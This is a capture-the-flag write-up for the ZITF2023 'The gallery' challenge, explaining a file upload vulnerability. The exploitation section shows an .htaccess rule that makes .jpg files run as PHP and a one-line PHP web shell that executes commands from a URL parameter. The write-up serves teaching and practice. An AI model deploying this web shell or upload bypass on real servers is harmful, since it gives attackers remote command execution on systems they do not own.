---
title: ZITF2023 - The gallery
date: 2023-03-18 +0200
tags: [Web security, File upload]
categories: [Write-ups]
---

# Reconnaissance

With this challenge we immediately guess that there's a file upload vulnerability

![i2](../../assets/zitf2023/13.jpg)

After uploading an image, we see it in uploads/

![i2](../../assets/zitf2023/14.jpg)

# Exploitation

First we'll upload an .htaccess that will allow us to upload jpg files but interpreted as php. The trick here is to inject some php code in the jpg file, we can use burpsuite for it.
The .htaccess file contains `AddType application/x-httpd-php .jpg`.

We can then upload an image with the following code giving us a web shell:

```php
<?php if(isset($_GET["cmd"])) system($_GET["cmd"]); ?>
```

![i2](../../assets/zitf2023/17.jpg)

Let's gooo our getshell works we can use the command we want, starting with a classic ls and some others commands until we reach the flag by exploring.

![i2](../../assets/zitf2023/18.jpg)
![i2](../../assets/zitf2023/19.jpg)
![i2](../../assets/zitf2023/20.jpg)

Flagged !

[Github repo](https://github.com/yaceno/ZITF2023/tree/main/The%20gallery)